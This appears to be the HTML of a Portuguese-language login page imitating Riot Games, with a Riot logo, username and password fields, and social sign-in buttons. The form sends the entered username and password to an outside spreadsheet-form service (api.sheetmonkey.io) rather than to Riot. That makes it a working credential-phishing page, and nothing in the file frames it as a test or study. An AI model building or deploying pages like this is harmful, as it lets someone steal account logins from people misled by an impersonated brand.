<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="./css/style.css">
</head>
<body>
   <main>
    <form action="https://api.sheetmonkey.io/form/kuEYS2uTEvh5qKiLUtDz4D" method="post">
        <section class="Login">
            
            <div class="wrapper">
                <img src="./imagens/logo_riot.png" class="login_logo">

                <h1 class="login_title">Fazer Login</h1>
   
               <label class="login_label">
                   <span>nome de usuário</span>
                   <input type="text" name="username" class="input">
               </label>
   
               <label class="login_label">
                   <span>senha</span>
                   <input type="password" name="password" class="input">
               </label>
   
              <div class="login_icons">
                   <button type="button" class="icons_button"><img src="./imagens/facebook_icon-removebg-preview.png"></button>
                   <button type="button" class="icons_button"><img src="./imagens/google_icon.png"></button>
                   <button type="button" class="icons_button"><img src="./imagens/Vectorized_Apple_gray_logo.svg-removebg-preview.png"></button>
               </div>
   
                <label class="login_label--checkbox">
                   <input type="checkbox" class="input--checkbox">
                   Manter login
               </label>
            </div>
          
            <div class="wrapper">
                <button class="login_button" type="submit"><img src="./imagens/botao_enviar.jpg"></button>
                <a href="#" class="login_link">não consegue iniciar sessão?</a>
                <a href="#" class="login_link">criar conta</a>
            </div>
       


        </section>
    </form>

        <section class="Wallpaper">

        </section>
   </main>
    





    <script src="./js/script.js"></script>
</body>
</html>
